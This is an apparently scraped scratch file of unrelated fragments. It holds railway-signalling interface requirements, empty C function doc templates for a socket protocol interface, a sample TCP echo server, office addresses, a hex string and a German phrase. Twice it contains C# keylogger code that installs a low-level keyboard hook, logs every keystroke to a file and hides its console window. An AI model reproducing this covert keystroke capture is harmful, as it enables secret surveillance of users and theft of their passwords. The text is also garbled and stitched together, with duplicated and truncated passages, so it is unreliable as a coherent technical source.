The system shall be tested in accordance with all relevant standards unless a derogation or TNC has been granted and with all applicable legislation. Where it is necessary to 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which 

All interfaces between subsystems shall be designed so that the overall behaviour of the system is as intended. Allowance shall be made for differences in the manner in which the different subsystems respond to input stimuli such as differences in response time by equipment using different technologies and indeterminate effects that arise from asynchronous operating cycles in different subsystems. It shall be confirmed that the effects of reasonably foreseeable unintended behaviour of any subsystem does not result in dangerous behaviour arising in any other subsystem.


thread = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveThread));

thread.Start();

[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

// The two dll imports below will handle the window hiding.

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x0100;
private static LowLevelKeyboardProc _proc = HookCallback;
private static IntPtr _hookID = IntPtr.Zero;

 private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);
            StreamWriter sw = new StreamWriter(Application.StartupPath+ @"\log.txt",true);
            sw.Write((Keys)vkCode);
            sw.Close();
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

   var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

_hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

 private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;


        private delegate IntPtr LowLevelKeyboardProc(
       int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

 var handle = GetConsoleWindow();

        // Hide
        ShowWindow(handle, SW_HIDE);

        _hookID = SetHook(_proc);

/**
<pre>
FUNCTION:                                                                  
  void GetDecodeStats(DWORD *goodC, DWORD *badC, DWORD *goodA, DWORD *badA)

DESCRIPTION:                                                               
  Access function for the global variables counting good and failed NVFB3  
  decodes                                                                  

PARAMETERS:                                                                
  DWORD *goodC      Output parameter to contain good control request count 
  DWORD *badC       Output parameter to contain bad control request count  
  DWORD *goodA      Output parameter good ARS subarea status request count 
  DWORD *badA       Output parameter bad ARS subarea status request count  

RETURNS:                                                                   
  void                                                                     
</pre>
*/

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void InitialiseConnectionInformation()


/**
<pre>
FUNCTION:                                                                  
  void InitialiseConnectionInformation()
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t * GetConnection(WORD index)

/**
<pre>
FUNCTION:                                                                  
  ConnectionListInformation_t * GetConnection(WORD index)

DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

ConnectionListInformation_t *GetConnectionInformation(DWORD Socket)

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD HandleIncomingDataStream(DWORD Socket, const char *request);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


void CALLBACK IconisTransmitPeriod(UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2);

periodically called every 250ms

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/


/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

will crate a new connection or extract one thats already in use.

void CreateNewConnection(DWORD Socket, char *ipaddress);

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

void CloseAConnection(DWORD Socket)

DWORD Socket

/**
<pre>
FUNCTION:                                                                  
  
DESCRIPTION:                                                               
  
PARAMETERS:                                                                
  
RETURNS:                                                                   
  
</pre>
*/

WORD isMaster(WORD connectionID)

WORD connectionID

UINT wTimerID, UINT msg, DWORD dwUser, DWORD dw1, DWORD dw2

DWORD Socket, const char *request

WORD

DWORD Socket

WORD index

ConnectionListInformation_t *

WORD printConnectionInformationToString(char *output, WORD n)

char *output, WORD n

WORD printConnectionStatInformationToString(char *output, WORD n)

char *output, WORD n

MCS_if.c

MCS_PS9.c

NVFB3.c

SocketInit.cp

DecodeNVFB3Data.cpp

EncodeNVFB3Data.cpp

EncodeDecodeCRC.cpp

DoProcess.cpp

EncodeDecodeBase64.cpp

MCS_if

MCS_PS9.c

NVFB3.c

SocketInit.cpp

DecodeNVFB3Data.cpp

EncodeDecodeCRC.cpp

EncodeNVFB3Data.cpp

DoProcess.cpp

EncodeDecodeBase64.cpp

8	Make sure the connection is broken as soon as any information has been corrupted. This can be done by modifying the information on the ICONIS Simulator. As soon as the SRIF see the information is incorrect the link will be dropped. 
The ICONIS Simulator should then be able to reconnect with no issue.


#using <System.dll>

using namespace System;
using namespace System::IO;
using namespace System::Net;
using namespace System::Net::Sockets;
using namespace System::Text;
using namespace System::Threading;
void main()
{
   try
   {

      // Set the TcpListener on port 13000.
      Int32 port = 13000;
      IPAddress^ localAddr = IPAddress::Parse( "127.0.0.1" );

      // TcpListener* server = new TcpListener(port);
      TcpListener^ server = gcnew TcpListener( localAddr,port );

      // Start listening for client requests.
      server->Start();

      // Buffer for reading data
      array<Byte>^bytes = gcnew array<Byte>(256);
      String^ data = nullptr;

      // Enter the listening loop.
      while ( true )
      {
         Console::Write( "Waiting for a connection... " );

         // Perform a blocking call to accept requests.
         // You could also user server.AcceptSocket() here.
         TcpClient^ client = server->AcceptTcpClient();
         Console::WriteLine( "Connected!" );
         data = nullptr;

         // Get a stream Object* for reading and writing
         NetworkStream^ stream = client->GetStream();
         Int32 i;

         // Loop to receive all the data sent by the client.
         while ( i = stream->Read( bytes, 0, bytes->Length ) )
         {

            // Translate data bytes to a ASCII String*.
            data = Text::Encoding::ASCII->GetString( bytes, 0, i );
            Console::WriteLine( "Received: {0}", data );

            // Process the data sent by the client.
            data = data->ToUpper();
            array<Byte>^msg = Text::Encoding::ASCII->GetBytes( data );

            // Send back a response.
            stream->Write( msg, 0, msg->Length );
            Console::WriteLine( "Sent: {0}", data );
         }

         // Shutdown and end connection
         client->Close();
      }
   }
   catch ( SocketException^ e ) 
   {
      Console::WriteLine( "SocketException: {0}", e );
   }

   Console::WriteLine( "\nHit enter to continue..." );
   Console::Read();
}

SWIA 2DB

6 Craigs Court,
Whitehal

	
BT IT Services
Whitehall TE, 
6 Craigs Court,
Whitehall

Technical Consultants

 if ((logmask & gLogmask) || (logmask == ALWAYS))
    {

EnterCriticalSection

MCSIF

LOGGER("Cannot lock the mutext must wait until free", "", MCSIF);

LOGMASK_MCSIF

        Sleep(50);


hWnd,

Horsforth

0aa502000c00c31eda5494c7d754aa550d000100000000000000000006050000080000000000400024

annot lock the interlockin mu

	
BT IT Services
Whitehall TE, 
6 Craigs Court,
Whitehall
SWIA 2DB

TcpListener

INADDR_ANY

IPAddress

4.2_004 

Familiennachzug 

family reunion

